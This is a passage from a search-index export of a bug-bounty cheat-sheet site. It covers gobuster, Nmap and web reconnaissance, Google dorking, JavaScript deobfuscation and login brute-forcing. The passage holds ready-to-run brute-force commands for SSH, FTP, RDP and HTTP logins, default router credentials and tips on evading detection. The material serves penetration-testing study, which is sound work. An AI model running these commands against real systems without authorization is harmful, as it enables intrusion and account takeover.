&lt;wordlist&gt;</code> Brute-force directories and files on a web server. <code>gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt</code> <code>gobuster dns -d &lt;domain&gt; -w &lt;wordlist&gt;</code> Enumerate subdomains via DNS brute-forcing. <code>gobuster dns -d example.com -w subdomains.txt</code> <code>gobuster vhost -u &lt;url&gt; -w &lt;wordlist&gt;</code> Discover virtual hosts on a target IP. <code>gobuster vhost -u http://10.10.10.10 -w vhosts.txt</code>"},{"location":"bug-bounty-guide/gobuster-cheat/#commonly-used-flags","title":"Commonly Used Flags","text":"Flag Purpose <code>-u</code> Specifies the target URL or domain (e.g., <code>-u http://example.com</code>). <code>-w</code> Defines the wordlist file for brute-forcing (e.g., <code>-w /usr/share/wordlists/dirb/common.txt</code>). <code>-t</code> Sets the number of concurrent threads (e.g., <code>-t 50</code> for faster scanning). <code>-x</code> Specifies file extensions to test (e.g., <code>-x php,txt</code> for <code>.php</code> and <code>.txt</code>). <code>-k</code> Ignores SSL/TLS errors (e.g., <code>-k</code> for self-signed certificates). <code>-o</code> Outputs results to a file (e.g., <code>-o results.txt</code>). <code>-s</code> Filters by HTTP status codes (e.g., <code>-s 200,204</code> to show only 200 or 204 responses). <code>-e</code> Expands results to show full URLs (e.g., <code>-e</code> for detailed output)."},{"location":"bug-bounty-guide/gobuster-cheat/#advanced-usage","title":"Advanced Usage","text":"Command Description Example <code>gobuster dir -u &lt;url&gt; -w &lt;wordlist&gt; -x php,html -t 50 -k</code> Directory brute-forcing with extensions, threads, and SSL bypass. <code>gobuster dir -u https://example.com -w common.txt -x php,html -t 50 -k</code> <code>gobuster dns -d &lt;domain&gt; -w &lt;wordlist&gt; -t 100 -o subdomains.txt</code> Aggressive subdomain enumeration with high threads and output. <code>gobuster dns -d example.com -w subdomains-top1million-5000.txt -t 100 -o subdomains.txt</code> <code>gobuster vhost -u &lt;url&gt; -w &lt;wordlist&gt; -t 30 -s 200</code> Virtual host scanning with thread count and status filter. <code>gobuster vhost -u http://10.10.10.10 -w vhosts.txt -t 30 -s 200</code>"},{"location":"bug-bounty-guide/gobuster-cheat/#wordlists","title":"Wordlists","text":"<ul> <li>Directories/Files: <code>/usr/share/wordlists/dirb/common.txt</code>, <code>/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code></li> <li>Subdomains: <code>/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></li> <li>Virtual Hosts: Custom lists like <code>vhosts.txt</code> with common names (e.g., <code>admin</code>, <code>dev</code>).</li> </ul>"},{"location":"bug-bounty-guide/gobuster-cheat/#tips","title":"Tips","text":"<ul> <li>Use <code>-t 10-100</code> based on target sensitivity to avoid detection.</li> <li>Combine with Nmap to verify open ports before scanning.</li> <li>Check <code>robots.txt</code> for hints to seed wordlists.</li> </ul>"},{"location":"bug-bounty-guide/gobuster-cheat/#tools","title":"Tools","text":"<ul> <li>Gobuster: https://github.com/OJ/gobuster</li> <li>SecLists: https://github.com/danielmiessler/SecLists</li> </ul>"},{"location":"bug-bounty-guide/hacking-wordpress/","title":"Hacking WordPress","text":""},{"location":"bug-bounty-guide/hacking-wordpress/#commands","title":"Commands","text":"Command Description <code>tree -L 1</code> Lists contents of current directory <code>curl -s -X GET &lt;url&gt;</code> Makes a GET request to a webserver and receives HTML source code of requested web page <code>curl -I -X GET &lt;url&gt;</code> Prints the response header of the GET request from the requested web page <code>curl -X POST -d &lt;data&gt; &lt;url&gt;</code> Sends a POST request with data to specific webserver <code>wpscan --url &lt;url&gt; -e ap</code> Scans specific WordPress application to enumerate plugins <code>wpscan --url &lt;url&gt; -e u</code> Scans specific WordPress application to enumerate users <code>msfconsole</code> Starts Metasploit Framework <code>html2text</code> Converts redirected HTML output or files to easily readable output <code>grep &lt;pattern&gt;</code> Filters specific pattern in files or redirected output <code>jq</code> Transforms JSON input and streams of JSON entities <code>man &lt;tool&gt;</code> Man provides you with the manpage of the specific tool"},{"location":"bug-bounty-guide/information-gathering-web-edition/","title":"Information Gathering","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#nmap-scans","title":"Nmap Scans","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#scan-types","title":"Scan Types","text":"<p>Common Nmap scan types and flags with examples:</p> Scan Type Description Flag TCP SYN Scan Stealthy half-open scan for TCP ports. Example: <code>nmap -sS -T4 192.168.1.1</code> -sS TCP Connect Scan Full TCP connection scan. Example: <code>nmap -sT -p 1-1000 192.168.1.1</code> -sT UDP Scan Scan for UDP ports. Example: <code>nmap -sU -sV 192.168.1.1</code> -sU Ping Scan Host discovery without port scanning. Example: <code>nmap -sn 192.168.1.0/24</code> -sn (or -sP) Version Detection Identify service versions on open ports. Example: <code>nmap -sV -p 80,443 192.168.1.1</code> -sV OS Detection Fingerprint operating system. Example: <code>nmap -O 192.168.1.1</code> -O Script Scan Run NSE scripts for additional info. Example: <code>nmap -sC 192.168.1.1</code> -sC Aggressive Scan Combines version, OS, script, and traceroute. Example: <code>nmap -A 192.168.1.1</code> -A Idle/Zombie Scan Stealth scan using spoofed IP. Example: <code>nmap -sI zombie.host 192.168.1.1</code> -sI"},{"location":"bug-bounty-guide/information-gathering-web-edition/#commonly-used-nmap-flags","title":"Commonly Used Nmap Flags","text":"<p>Additional flags to customize Nmap scans:</p> Flag Purpose <code>-p</code> Defines a port range or specific ports to scan (e.g., <code>-p 1-1000</code> for ports 1-1000, <code>-p 80,443</code> for specific ports). <code>-T&lt;0-5&gt;</code> Sets timing template (0=paranoid to 5=insane) to control scan speed (e.g., <code>-T4</code> for faster scans). <code>-A</code> Enables aggressive scan features (version detection, OS detection, scripting, traceroute). <code>-oN</code> Outputs scan results to a normal file (e.g., <code>-oN scan.txt</code>). <code>-v</code> Increases verbosity for detailed output during the scan. <code>-Pn</code> Treats all hosts as online, skipping host discovery (useful for firewalls). <code>-iL</code> Reads targets from a file (e.g., <code>-iL targets.txt</code> for a list of IPs)."},{"location":"bug-bounty-guide/information-gathering-web-edition/#web-reconnaissance","title":"Web Reconnaissance","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#goals","title":"Goals","text":"<ul> <li>Identify Assets: Discovering all associated domains, subdomains, and IP addresses provides a map of the target's online presence.</li> <li>Uncover Hidden Information: Web reconnaissance aims to uncover directories, files, and technologies that are not readily apparent and could serve as entry points for an attacker.</li> <li>Analyse the Attack Surface: By identifying open ports, running services, and software versions, you can assess the potential vulnerabilities and weaknesses of the target.</li> <li>Gather Intelligence: Collecting information about employees, email addresses, and technologies used can aid in social engineering attacks or identifying specific vulnerabilities associated with certain software.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#active-reconnaissance","title":"Active Reconnaissance","text":"Technique Description Example Tools Risk Port Scanning Identifies open ports. Nmap scans ports 80, 443. Nmap, Masscan High Vulnerability Scanning Probes for vulnerabilities. Nessus checks for XSS. Nessus, Nikto High Network Mapping Maps network topology. Traceroute tracks hops. Traceroute, Nmap Medium-High Banner Grabbing Retrieves service banners. curl checks HTTP version. Netcat, curl Low OS Fingerprinting Detects OS type. Nmap uses -O. Nmap, Xprobe2 Low Service Enumeration Identifies service versions. Nmap -sV on port 80. Nmap Low Web Spidering Crawls website structure. Burp Spider maps pages. Burp, ZAP Spider Low-Medium"},{"location":"bug-bounty-guide/information-gathering-web-edition/#passive-reconnaissance","title":"Passive Reconnaissance","text":"Technique Description Example Tools Risk Search Engine Queries Uncovers public data. Google for employee names. Google, Shodan Very Low WHOIS Lookups Retrieves domain details. whois on example.com. whois, online Very Low DNS Analysis Identifies DNS records. dig for subdomains. dig, dnsenum Very Low Web Archive Analysis Reviews historical sites. Wayback for old pages. Wayback Machine Very Low Social Media Analysis Gathers social profiles. LinkedIn for employees. LinkedIn, OSINT Very Low Code Repositories Analyzes public code. GitHub for credentials. GitHub, GitLab Very Low"},{"location":"bug-bounty-guide/information-gathering-web-edition/#whois","title":"WHOIS","text":"<pre><code>whois example.com\n</code></pre> <p>Note: WHOIS data can be inaccurate or intentionally obscured, so verify from multiple sources. Privacy services may mask the true owner.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#dns","title":"DNS","text":"<pre><code>dig example.com A\n</code></pre> <p>This retrieves the A record (hostname to IPv4 address). The output includes the IP address and query details.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#dns-record-types","title":"DNS Record Types","text":"Record Type Full Name Description A Address Record Maps a hostname to its IPv4 address. AAAA IPv6 Address Record Maps a hostname to its IPv6 address. CNAME Canonical Name Record Creates an alias for a hostname, pointing to another hostname. MX Mail Exchange Record Specifies the mail server(s) responsible for handling email. NS Name Server Record Delegates a DNS zone to an authoritative name server. TXT Text Record Stores arbitrary text information, often for verification or policies. SOA Start of Authority Record Specifies administrative details about a DNS zone. SRV Service Record Defines hostname and port for specific services. PTR Pointer Record Used for reverse DNS lookups, mapping an IP to a hostname."},{"location":"bug-bounty-guide/information-gathering-web-edition/#dns-tools","title":"DNS Tools","text":"Tool Key Features Use Cases dig Versatile DNS lookup, multiple query types Manual queries, zone transfers, troubleshooting nslookup Simple DNS lookup for A, AAAA, MX Basic resolution, mail checks host Concise DNS lookup Quick A, AAAA, MX checks dnsenum Automated enumeration, brute-forcing Subdomain discovery, DNS data fierce Subdomain enumeration, wildcard detection DNS recon, target identification dnsrecon Multi-technique enumeration, various outputs Comprehensive subdomain analysis theHarvester OSINT from DNS and other sources Email, employee data collection Online DNS Lookup User-friendly lookup interfaces Quick lookups, domain checks"},{"location":"bug-bounty-guide/information-gathering-web-edition/#subdomains","title":"Subdomains","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#subdomain-enumeration","title":"Subdomain Enumeration","text":"Approach Examples Active Enumeration Brute-forcing, DNS zone transfers Passive Enumeration Certificate Transparency (CT) logs, search engine queries"},{"location":"bug-bounty-guide/information-gathering-web-edition/#brute-force-enumeration-tools","title":"Brute-Force Enumeration Tools","text":"Tool Description dnsenum Comprehensive DNS enumeration fierce User-friendly subdomain discovery dnsrecon Versatile multi-technique enumeration amass Actively maintained subdomain tool assetfinder Lightweight subdomain finder puredns Powerful DNS brute-forcing <p>Examples:</p> <pre><code>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r\n</code></pre> <p>Note: -r enables recursive subdomain brute-forcing.</p> <pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://hackthebox.eu/\n</code></pre> <pre><code>gobuster dns -d https://hackthebox.eu/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#dns-zone-transfers","title":"DNS Zone Transfers","text":"<pre><code>dig @nsztm1.digi.ninja zonetransfer.me axfr\n</code></pre> <ul> <li>dig: DNS lookup utility.</li> <li>@ns1.example.com: Specifies the nameserver to query (e.g., ns1.example.com).</li> <li>example.com: Domain to perform the lookup on.</li> <li>axfr: Requests a zone transfer, retrieving all DNS records for the domain.</li> </ul> <p>Note - Many DNS servers restrict zone transfers to authorized servers. - zonetransfer.me is a service specifically setup to demonstrate the risks of zone transfers so that the dig command will return the full zone record.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#virtual-hosts","title":"Virtual Hosts","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#virtual-host-discovery-tools","title":"Virtual Host Discovery Tools","text":"Tool Description Features gobuster Multi-purpose brute-forcer Fast, custom wordlists Feroxbuster Rust-based fuzzer Recursion, filters ffuf Fast web fuzzer Custom input, filtering <p>Examples:</p> <pre><code>gobuster vhost -u http://192.0.2.1 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain\ngobuster vhost -u http://web1337.inlanefreight.htb:8888 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 60 --append-domain\n</code></pre> <p>Common flags:</p> Flag Description -t Increase threads for faster scanning -k Ignore SSL/TLS certificate errors -o Save output to a file"},{"location":"bug-bounty-guide/information-gathering-web-edition/#certificate-transparency-ct-logs","title":"Certificate Transparency (CT) Logs","text":"<p>CT logs record SSL/TLS certificates, revealing subdomains.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#searching-ct-logs","title":"Searching CT Logs","text":"Tool Key Features Use Cases Pros Cons crt.sh User-friendly interface, domain search, SAN details Quick subdomain checks, certificate history Free, no registration Limited filtering Censys Advanced filtering, IP/certificate search In-depth analysis, misconfigurations Extensive data, API Requires registration <p>Example:</p> <pre><code>curl -s \"https://crt.sh/?q=facebook.com&amp;output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#fingerprinting","title":"Fingerprinting","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#techniques","title":"Techniques","text":"Technique Description Banner Grabbing Analyzes server banners for software and version details. Analysing HTTP Headers Examines headers (e.g., Server, X-Powered-By) for tech info. Probing for Responses Sends crafted requests to elicit unique tech-specific responses. Analysing Page Content Reviews page elements (e.g., copyright) for tech clues."},{"location":"bug-bounty-guide/information-gathering-web-edition/#tools","title":"Tools","text":"Tool Description Features Wappalyzer Browser extension for tech profiling Identifies CMSs, frameworks, analytics BuiltWith Web tech profiler with reports Free/paid plans, detailed stacks WhatWeb Command-line website fingerprinting Uses signature database Nmap Versatile network scanner NSE for specialised fingerprinting Netcraft Web security and fingerprinting Tech, hosting, security reports wafw00f WAF identification tool Detects WAF type and configuration"},{"location":"bug-bounty-guide/information-gathering-web-edition/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code>curl -I inlanefreight.com\n</code></pre> <p>Find CMS info:</p> <pre><code>curl -s http://app.inlanefreight.local/index.php | grep '&lt;meta name=\"generator\"'\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#wafw00f","title":"Wafw00f","text":"<pre><code>pip3 install git+https://github.com/EnableSecurity/wafw00f\nwafw00f inlanefreight.com\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#nikto","title":"Nikto","text":"<pre><code>sudo apt update &amp;&amp; sudo apt install -y perl\ngit clone https://github.com/sullo/nikto\ncd nikto/program\nchmod +x ./nikto.pl\nnikto -h inlanefreight.com -Tuning b\n</code></pre> <ul> <li>-h specifies the target host.</li> <li>-Tuning b flag tells Nikto to only run the Software Identification modules.</li> </ul>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#robotstxt","title":"robots.txt","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#robotstxt-structure","title":"robots.txt Structure","text":"<p>The robots.txt file is a plain text file in the website's root, using records separated by blank lines.</p> Component Description User-agent Specifies crawler or bot the rules apply to (e.g., * for all, Googlebot, Bingbot). Directives Instructions for the specified user-agent."},{"location":"bug-bounty-guide/information-gathering-web-edition/#common-directives","title":"Common Directives","text":"Directive Description Example Disallow Blocks bot from paths or patterns. Disallow: /admin/ Allow Permits specific paths despite Disallow. Allow: /public/ Crawl-delay Sets delay (seconds) between requests. Crawl-delay: 10 Sitemap Provides XML sitemap URL. Sitemap: sitemap.xml"},{"location":"bug-bounty-guide/information-gathering-web-edition/#well-known-uris","title":"Well-Known URIs","text":"<p>The .well-known standard (RFC 8615) centralizes website metadata in /.well-known/.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#examples","title":"Examples","text":"URI Suffix Description Status Reference security.txt Contact info for vulnerability reports Permanent RFC 9116 change-password URL for password change Provisional https://w3c.github.io/webappsec-change-password-url/ openid-configuration OpenID Connect configuration Permanent http://openid.net/specs/openid-connect-discovery-1_0.html assetlinks.json Verifies digital asset ownership Permanent https://github.com/google/digitalassetlinks/blob/master/well-known/specification.md mta-sts.txt SMTP MTA-STS security policy Permanent RFC 8461 <p>All well-known URIs</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#web-crawling","title":"Web Crawling","text":"<p>Web crawling maps a website's structure by following links. Analyze <code>robots.txt</code> for hidden directories.</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#popular-web-crawlers","title":"Popular Web Crawlers","text":"Tool Description Burp Suite Spider Active crawler for mapping and vulnerability discovery. OWASP ZAP Open-source scanner with spider for vulnerability checks. Scrapy Python framework for custom, scalable crawling. Apache Nutch Scalable Java crawler for large-scale recon."},{"location":"bug-bounty-guide/information-gathering-web-edition/#scrapy","title":"Scrapy:","text":"<p>Using custom Scrapy spider, ReconSpider, output will be in JSON:</p> <pre><code>pip3 install scrapy\nwget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip\nunzip ReconSpider.zip \npython3 ReconSpider.py http://inlanefreight.com\n</code></pre> Key Description emails Lists email addresses found on the domain. links Lists URLs of links found within the domain. external_files Lists URLs of external files such as PDFs. js_files Lists URLs of JavaScript files used by the website. form_fields Lists form fields found on the domain (empty in this example). images Lists URLs of images found on the domain. videos Lists URLs of videos found on the domain (empty in this example). audio Lists URLs of audio files found on the domain (empty in this example). comments Lists HTML comments found in the source code. <p>Searching Results:</p> <pre><code>cat results.json | jq '.emails'\ncat results.json | jq '.comments'\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#spider-code-example","title":"Spider code example","text":"<pre><code>import scrapy\n\nclass ExampleSpider(scrapy.Spider):\n    name = \"example\"\n    start_urls = ['http://example.com/']\n\n    def parse(self, response):\n        for link in response.css('a::attr(href)').getall():\n            if any(link.endswith(ext) for ext in self.interesting_extensions):\n                yield {\"file\": link}\n            elif not link.startswith(\"#\") and not link.startswith(\"mailto:\"):\n                yield response.follow(link, callback=self.parse)\n</code></pre> <p>Extract links:</p> <pre><code>jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#search-engine-discovery","title":"Search Engine Discovery","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#google-dorking","title":"Google Dorking","text":"Operator Description Example Example Description site: Limits results to a domain. site:example.com Find all pages on example.com. inurl: Finds term in URL. inurl:login Search for login pages. filetype: Searches for specific file types. filetype:pdf Find downloadable PDFs. intitle: Finds term in title. intitle:\"confidential report\" Look for pages titled \"confidential report\". intext: Searches term in body text. intext:\"password reset\" Identify pages with \"password reset\". cache: Shows cached webpage version. cache:example.com View cached content of example.com. link: Finds pages linking to URL. link:example.com Identify sites linking to example.com. related: Finds similar websites. related:example.com Discover sites like example.com. info: Shows webpage summary. info:example.com Get details about example.com. define: Provides word/phrase definitions. define:phishing Get \"phishing\" definitions. numrange: Searches within number range. site:example.com numrange:1000-2000 Find numbers 1000-2000 on example.com. allintext: Requires all words in body. allintext:admin password reset Find pages with \"admin\" and \"password reset\". allinurl: Requires all words in URL. allinurl:admin panel Find URLs with \"admin\" and \"panel\". allintitle: Requires all words in title. allintitle:confidential report 2023 Find titles with \"confidential report 2023\". AND Requires all terms. site:example.com AND (inurl:admin OR inurl:login) Find admin/login on example.com. OR Includes any of the terms. \"linux\" OR \"ubuntu\" OR \"debian\" Search for Linux, Ubuntu, or Debian pages. NOT Excludes specified term. site:bank.com NOT inurl:login Find bank.com pages excluding login. * (wildcard) Represents any character/word. site:socialnetwork.com filetype:pdf user* manual Find user manuals in PDFs. ... (range) Finds results in numerical range. site:ecommerce.com \"price\" 100..500 Find products priced 100-500. \" \" (quotes) Searches exact phrase. \"information security policy\" Find exact \"information security policy\". - (minus) Excludes terms. site:news.com -inurl:sports Find news.com pages excluding sports. <p>Google Hacking Database</p>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#web-archives","title":"Web Archives","text":"<p>Web archives like the Wayback Machine store historical website snapshots:</p> Feature Description Use Case in Reconnaissance Historical Snapshots View past versions of websites. Identify past content or functionality. Hidden Directories Explore removed or hidden directories. Discover sensitive information or backups. Content Changes Track changes in content. Assess security posture evolution."},{"location":"bug-bounty-guide/information-gathering-web-edition/#automating-recon","title":"Automating Recon","text":""},{"location":"bug-bounty-guide/information-gathering-web-edition/#reconnaissance-frameworks","title":"Reconnaissance Frameworks","text":"<p>These frameworks provide a complete suite of tools for web reconnaissance.</p> Framework Description FinalRecon Python tool for SSL, Whois, headers, and crawling. Recon-ng Python framework for DNS, subdomains, and exploits. theHarvester Python tool for emails, subdomains, and banners. SpiderFoot OSINT tool for IPs, domains, emails, and scanning. OSINT Framework Collection of tools for social media and records."},{"location":"bug-bounty-guide/information-gathering-web-edition/#finalrecon","title":"FinalRecon","text":"<pre><code>git clone https://github.com/thewhiteh4t/FinalRecon.git\ncd FinalRecon\npip3 install -r requirements.txt\nchmod +x ./finalrecon.py\n</code></pre>"},{"location":"bug-bounty-guide/information-gathering-web-edition/#command-options","title":"Command Options","text":"Option Argument Description -h, --help Show the help message and exit. --url URL Specify the target URL. --headers Retrieve header information. --sslinfo Get SSL certificate information. --whois Perform a Whois lookup. --crawl Crawl the target website. --dns Perform DNS enumeration. --sub Enumerate subdomains. --dir Search for directories. --wayback Retrieve Wayback URLs. --ps Perform a fast port scan. --full Perform a full reconnaissance scan."},{"location":"bug-bounty-guide/introduction-to-web-applications/","title":"Introduction to Web Applications","text":""},{"location":"bug-bounty-guide/introduction-to-web-applications/#web-stack-combinations","title":"Web Stack Combinations","text":"Combinations Components LAMP Linux, Apache, MySQL, and PHP WAMP Windows, Apache, MySQL, and PHP WINS Windows, IIS, .NET, and SQL Server MAMP macOS, Apache, MySQL, and PHP XAMPP Cross-Platform, Apache, MySQL, and PHP/PERL"},{"location":"bug-bounty-guide/introduction-to-web-applications/#owasp-top-ten-vulnerabilities","title":"OWASP Top Ten Vulnerabilities","text":"No. Vulnerability 1 Broken Access Control 2 Cryptographic Failures 3 Injection 4 Insecure Design 5 Security Misconfiguration 6 Vulnerable and Outdated Components 7 Identification and Authentication Failures 8 Software and Data Integrity Failures 9 Security Logging and Monitoring Failures 10 Server-Side Request Forgery (SSRF) <ul> <li>OWASP top 10 vulnerabilities</li> <li>OWASP web application security testing guide</li> <li>OWASP cheat sheet series</li> </ul>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#url-encoding-reference","title":"URL Encoding Reference","text":"Character URL Encoded space %20 ! %21 \" %22 # %23 $ %24 % %25 &amp; %26 ' %27 ( %28 ) %29"},{"location":"bug-bounty-guide/introduction-to-web-applications/#practicing-web-application-development-steps","title":"Practicing Web Application Development Steps","text":"Step To-Do 1 Set up a VM with a web server 2 Create an HTML page 3 Design it with CSS 4 Add some simple functions with JavaScript 5 Program a simple web application 6 Connect your web application to the database 7 Experiment with APIs 8 Test your application for various vulnerabilities and security holes 9 Try to adjust your code and configurations to close the vulnerabilities"},{"location":"bug-bounty-guide/introduction-to-web-applications/#tips","title":"Tips","text":"<ul> <li>Review source code for sensitive data exposure</li> </ul>"},{"location":"bug-bounty-guide/introduction-to-web-applications/#helpful-links","title":"Helpful Links","text":"<ul> <li>W3Schools</li> <li>Front end practice sandbox 1</li> <li>Front end practice sandbox 2</li> <li>Front end learn test and share</li> <li>Exploit DB</li> <li>Rapid7 DB</li> <li>National Vulnerability Database</li> <li>Common Vulnerability Scoring System: User Guide</li> </ul>"},{"location":"bug-bounty-guide/javascript-deobfuscation/","title":"JavaScript Deobfuscation","text":""},{"location":"bug-bounty-guide/javascript-deobfuscation/#terms","title":"Terms","text":"Term Description Code minification Reduces code to a single line often saved as .min.js. Packing Obfuscation recognizable from the six function arguments used in the initial function \"function(p,a,c,k,e,d)\". JSFuck Programming style based in the atomic parts of JS. Uses only ()+[]! (aa and jj encode are similar). Base 64 Contains only alpha-numeric, + and /. Padded with '='. Hex Encodes each char into its hex on the ASCII table. Contains 0-9 and a-f. Ceasar Shifts each char by a fixed number Rot13 Most common ceaser cipher, shifts by 13"},{"location":"bug-bounty-guide/javascript-deobfuscation/#commands","title":"Commands","text":"Command Description <code>curl http://SERVER_IP:PORT/</code> cURL GET request <code>curl -s http://SERVER_IP:PORT/ -X POST</code> cURL POST request <code>curl -s http://SERVER_IP:PORT/ -X POST -d \"param1=sample\"</code> cURL POST with data <code>echo hackthebox | base64</code> base64 encode <code>echo ENCODED_B64 | base64 -d</code> base64 decode <code>echo hackthebox | xxd -p</code> hex encode <code>echo ENCODED_HEX | xxd -p -r</code> hex decode <code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 encode <code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 decode"},{"location":"bug-bounty-guide/javascript-deobfuscation/#useful-websites","title":"Useful Websites","text":"Site Description JS Console Interactive JavaScript console for testing code. JS Minifier Minifies JavaScript for performance optimization. BeatifyTools Obfuscates JavaScript to protect code. JS Obfuscator Tool Tool to obfuscate JavaScript code securely. JSFuck Encodes JavaScript using only six characters. jjencode Encodes JavaScript with JJEncode technique. aaencode Encodes JavaScript with AAEncode method. Prettier Formats and beautifies JavaScript code. js-beautify Beautifies minified or obfuscated JavaScript. UnPacker Deobfuscates and unpacks JavaScript code. rot13.com Applies ROT13 encoding/decoding for text. Cipher Identifier Identifies cipher types in encoded text."},{"location":"bug-bounty-guide/javascript-deobfuscation/#misc","title":"Misc","text":"Command/Action Description <code>ctrl+u</code> Show HTML source code in Firefox <code>ctrl+shift+z</code> Open browser debugger tab '{ }' button Pretty print in debugger tab Unpack Replace eval function with console.log"},{"location":"bug-bounty-guide/login-brute-forcing/","title":"Login Brute Forcing","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#what-is-brute-forcing","title":"What is Brute Forcing?","text":"<p>A trial-and-error method used to crack passwords, login credentials, or encryption keys by systematically trying every possible combination of characters.</p>"},{"location":"bug-bounty-guide/login-brute-forcing/#factors-influencing-brute-force-attacks","title":"Factors Influencing Brute Force Attacks","text":"<ul> <li>Complexity of the password or key</li> <li>Computational power available to the attacker</li> <li>Security measures in place</li> </ul>"},{"location":"bug-bounty-guide/login-brute-forcing/#how-brute-forcing-works","title":"How Brute Forcing Works","text":"<ol> <li>Start: The attacker initiates the brute force process.</li> <li>Generate Possible Combination: The software generates a potential password or key combination.</li> <li>Apply Combination: The generated combination is attempted against the target system.</li> <li>Check if Successful: The system evaluates the attempted combination.</li> <li>Access Granted (if successful): The attacker gains unauthorized access.</li> <li>End (if unsuccessful): The process repeats until the correct combination is found or the attacker gives up.</li> </ol>"},{"location":"bug-bounty-guide/login-brute-forcing/#types-of-brute-forcing","title":"Types of Brute Forcing","text":"Attack Type Description Best Used When Simple Brute Force Tries every possible character combination in a set (e.g., lowercase, uppercase, numbers, symbols). When there is no prior information about the password. Dictionary Attack Uses a pre-compiled list of common passwords. When the password is likely weak or follows common patterns. Hybrid Attack Combines brute force and dictionary attacks, adding numbers or symbols to dictionary words. When the target uses slightly modified versions of common passwords. Credential Stuffing Uses leaked credentials from other breaches to access different services where users may have reused passwords. When you have a set of leaked credentials, and the target may reuse passwords. Password Spraying Attempts common passwords across many accounts to avoid detection. When account lockout policies are in place. Rainbow Table Attack Uses precomputed tables of password hashes to reverse them into plaintext passwords. When a large number of password hashes need cracking, and storage for tables is available. Reverse Brute Force Targets a known password against multiple usernames. When there\u2019s a suspicion of password reuse across multiple accounts. Distributed Brute Force Distributes brute force attempts across multiple machines to speed up the process. When the password is highly complex, and a single machine isn't powerful enough."},{"location":"bug-bounty-guide/login-brute-forcing/#default-credentials","title":"Default Credentials","text":"Device Username Password Linksys Router admin admin Netgear Router admin password TP-Link Router admin admin Cisco Router cisco cisco Ubiquiti UniFi AP ubnt ubnt"},{"location":"bug-bounty-guide/login-brute-forcing/#brute-forcing-tools","title":"Brute-Forcing Tools","text":""},{"location":"bug-bounty-guide/login-brute-forcing/#hydra","title":"Hydra","text":"<p>Fast network login cracker. Supports numerous protocols. Uses parallel connections for speed. Flexible and adaptable. Relatively easy to use.</p> <pre><code>hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [-C FILE] -m MODULE [service://server[:PORT][/OPT]]\n</code></pre>"},{"location":"bug-bounty-guide/login-brute-forcing/#hydra-service","title":"Hydra Service","text":"Service/Protocol Description Example Command ftp File Transfer Protocol (FTP). Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. <code>hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100</code> ssh Secure Shell (SSH). Targets SSH services to brute-force credentials, commonly used for secure remote login to systems. <code>hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100</code> http-get/post HTTP Web Services. Used to brute-force login credentials for HTTP web login forms using either GET or POST requests. <code>hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form \"/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect\"</code>"},{"location":"bug-bounty-guide/login-brute-forcing/#medusa","title":"Medusa","text":"<p>Fast, massively parallel, modular login brute-forcer. Supports a wide array of services.</p> <pre><code>medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]\n</code></pre>"},{"location":"bug-bounty-guide/login-brute-forcing/#medusa-module","title":"Medusa Module","text":"Module Service/Protocol Description Example Command ssh Secure Shell (SSH) Brute force SSH login for the admin user. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh</code> ftp File Transfer Protocol (FTP) Brute force FTP with multiple usernames and passwords using 5 parallel threads. <code>medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5</code> rdp Remote Desktop Protocol (RDP) Brute force RDP login. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp</code> http-get HTTP Web Services Brute force HTTP Basic Authentication. <code>medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET</code> ssh Secure Shell (SSH) Stop after the first valid SSH login is found. <code>medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh 